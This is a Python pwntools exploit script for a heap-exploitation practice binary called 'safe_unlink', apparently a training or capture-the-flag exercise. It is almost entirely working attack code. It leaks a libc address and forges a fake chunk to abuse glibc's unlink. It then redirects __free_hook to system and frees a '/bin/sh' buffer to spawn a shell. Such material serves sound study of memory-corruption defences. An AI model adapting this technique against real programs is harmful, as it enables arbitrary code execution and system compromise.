#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("safe_unlink", checksec=True)
libc = elf.libc
context.log_level = "debug"

gs = """
continue
"""

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)


io = start()
io.timeout = 1


def malloc(size):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"size: ", f"{size}".encode())


def edit(index, data):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"index: ", f"{index}".encode())
    io.sendlineafter(b"data: ", data)

def free(index):
    io.sendlineafter(b"> ", b"3")
    io.sendlineafter(b"index: ", f"{index}".encode())


io.recvuntil(b"puts() @")
puts_leak = int(io.recvline().rstrip(), 16)
libc.address = puts_leak - libc.sym.puts
log.info(f"libc rebased @ {libc.address:08x}")


malloc(0x88)
malloc(0x88)

m_array = elf.sym.m_array
fd = m_array-24
bk = m_array-16
prev_size = 0x80
fake_size = 0x90


# p64(0) - unused prev size field
# p64(0x80) - size field for our fake chunk (will abort if doesn't match the prev_size field of the chunk that led malloc to our fake chunk
# Write the fake chunk metadata to the "overflow" chunk.
# Overflow into the succeeding chunk's size field to clear the prev_inuse flag.
edit("0", p64(0) + p64(0x80) + p64(fd) + p64(bk) + p8(0x41)*0x60 + p64(prev_size) + p64(fake_size))

# Free the "victim" chunk to trigger backward consolidation with the "overflow" chunk.
free("1")

# After unlinking, the first entry in m_array points 0x18 bytes before m_array itself.
# Use the "edit" option to overwrite the first entry in m_array with the address of the free hook - 8.
edit("0", p64(0)*3 + p64(libc.sym.__free_hook-8))

# this will make the first entry of m_array /bin/sh and overwrites the free hook with the address of system
edit("0", b"/bin/sh\0" + p64(libc.sym.system))
# trigger our shell
free("0")


io.interactive()
